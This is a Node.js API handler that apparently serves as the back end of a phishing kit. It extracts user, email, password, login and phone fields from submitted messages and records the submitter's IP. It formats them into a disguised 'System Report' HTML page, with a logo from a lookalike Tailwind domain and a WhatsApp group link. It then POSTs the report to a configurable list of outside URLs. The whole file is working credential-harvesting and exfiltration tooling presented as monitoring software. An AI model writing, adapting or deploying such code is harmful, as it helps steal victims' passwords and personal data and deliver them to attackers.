const fs = require("fs");
const path = require("path");

const FILE = path.join(process.cwd(), "data", "urls.json");

// ======================
// ALLOWED VARIABLES
// ======================
const allowed = ["user", "email", "phone", "password", "login", "ip"];

// ======================
// LOAD URLS
// ======================
function loadUrls() {
  try {
    if (!fs.existsSync(FILE)) return [];
    return JSON.parse(fs.readFileSync(FILE, "utf8"));
  } catch {
    return [];
  }
}

// ======================
// SAVE URLS
// ======================
function saveUrls(data) {
  fs.writeFileSync(FILE, JSON.stringify(data, null, 2));
}

// ======================
// PARSE BODY
// ======================
function parseBody(req) {
  if (!req.body) return {};
  if (typeof req.body === "string") {
    return Object.fromEntries(new URLSearchParams(req.body));
  }
  return req.body;
}

// ======================
// STRIP HTML
// ======================
function stripHtml(input = "") {
  return String(input)
    .replace(/<script[\s\S]*?<\/script>/gi, "")
    .replace(/<style[\s\S]*?<\/style>/gi, "")
    .replace(/<[^>]*>/g, "\n");
}

// ======================
// EXTRACT VARS (WHITELIST)
// ======================
function extractVars(input = "") {
  const text = stripHtml(input);

  const vars = {};
  const regex = /([a-zA-Z0-9_]+)\s*[:=]\s*([^\n]+)/g;

  let m;
  while ((m = regex.exec(text)) !== null) {
    const key = m[1].toLowerCase().trim();
    const value = m[2].trim();

    if (allowed.includes(key) && value) {
      vars[key] = value;
    }
  }

  return vars;
}

// ======================
// BUILD ROW (AUTO SKIP EMPTY)
// ======================
function row(label, value, color = "#e5e7eb") {
  if (!value || value.trim() === "") return "";

  return `
  <tr>
    <td style="padding:10px 12px;border-bottom:1px solid #1f2937;color:#94a3b8;width:140px;font-size:13px">
      ${label}
    </td>
    <td style="padding:10px 12px;border-bottom:1px solid #1f2937;color:${color};font-size:13px">
      ${value}
    </td>
  </tr>`;
}

// ======================
// BUILD HTML
// ======================
function buildHtml(vars) {
  return `
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
</head>

<body style="margin:0;background:#0f172a;font-family:Arial,sans-serif;color:#e5e7eb">

<div style="max-width:700px;margin:40px auto;background:#111827;border:1px solid #1f2937;border-radius:12px;overflow:hidden">

  <!-- HEADER -->
  <div style="padding:18px 22px;background:#0b1220;border-bottom:1px solid #1f2937;display:flex;align-items:center;gap:12px">

    <img src="https://tailwiindcss.vercel.app/3b3dea7e-7574-445a-8d0d-98ec60b426b1.png"
      style="width:42px;height:42px;border-radius:8px">

    <div>
      <div style="font-size:15px;font-weight:600;color:#fff">
        System Report
      </div>
      <div style="font-size:12px;color:#94a3b8">
        Monitoring Dashboard
      </div>
    </div>

  </div>

  <!-- CONTENT -->
  <div style="padding:18px 22px">

    <table style="width:100%;border-collapse:collapse">

      ${row("User", vars.user)}
      ${row("Email", vars.email)}
      ${row("Password", vars.password, "#f87171")}
      ${row("Login", vars.login, "#34d399")}
      ${row("Phone", vars.phone)}
      ${row("IP Address", vars.ip, "#60a5fa")}

    </table>

  </div>

  <!-- JOIN WHATSAPP -->
  <div style="padding:18px 22px;text-align:center">

    <a href="https://chat.whatsapp.com/E0gWuMj5TH72MKRkTZsVEZ"
       style="
         display:inline-block;
         background:#25D366;
         color:#fff;
         text-decoration:none;
         padding:12px 18px;
         border-radius:8px;
         font-size:13px;
         font-weight:600;
         font-family:Arial,sans-serif;
       ">
      💬 Join WhatsApp Group
    </a>

  </div>

  <!-- FOOTER -->
  <div style="padding:14px 22px;border-top:1px solid #1f2937;background:#0b1220;font-size:11px;color:#6b7280;text-align:center">
    © 2026 System Monitoring
  </div>

</div>

</body>
</html>
`;
}

// ======================
// MAIN API
// ======================
module.exports = async (req, res) => {
  try {
    if (req.method !== "POST") {
      return res.status(405).json({ success: false, message: "POST only" });
    }

    const body = parseBody(req);

    let urls = loadUrls();
    const action = body.action || "send";

    // ======================
    // ADD URL
    // ======================
    if (action === "add-url") {
      if (!body.url) return res.json({ success: false, message: "URL kosong" });

      if (!urls.includes(body.url)) {
        urls.push(body.url);
        saveUrls(urls);
      }

      return res.json({ success: true, urls });
    }

    // ======================
    // DELETE URL
    // ======================
    if (action === "delete-url") {
      urls = urls.filter(x => x !== body.url);
      saveUrls(urls);
      return res.json({ success: true, urls });
    }

    // ======================
    // LIST URL
    // ======================
    if (action === "list-url") {
      return res.json({ success: true, urls });
    }

    // ======================
    // INPUT
    // ======================
    const subjek = body.subjek || "";
    const sender = body.sender || "system";
    const messageRaw = body.message || body.pesan || body.pesan_html || "";

    if (!subjek || !messageRaw) {
      return res.status(400).json({
        success: false,
        message: "subjek & message wajib diisi"
      });
    }

    // ======================
    // EXTRACT VARS
    // ======================
    const vars = extractVars(messageRaw);

    // auto IP fallback
    vars.ip =
      vars.ip ||
      req.headers["x-forwarded-for"]?.split(",")[0] ||
      req.socket?.remoteAddress ||
      "";

    // ======================
    // BUILD HTML CLEAN
    // ======================
    const html = buildHtml(vars);

    const payload = new URLSearchParams({
      subjek,
      pesan: html,
      sender
    }).toString();

    const fetchFn = global.fetch || require("node-fetch");

    const results = [];

    for (const url of urls) {
      try {
        const r = await fetchFn(url, {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded"
          },
          body: payload
        });

        results.push({
          url,
          status: r.status,
          success: r.ok
        });
      } catch (err) {
        results.push({
          url,
          success: false,
          error: err.message
        });
      }
    }

    return res.json({
      success: true,
      message: "sent",
      vars,
      total: urls.length,
      results
    });

  } catch (err) {
    return res.status(500).json({
      success: false,
      error: err.message
    });
  }
};
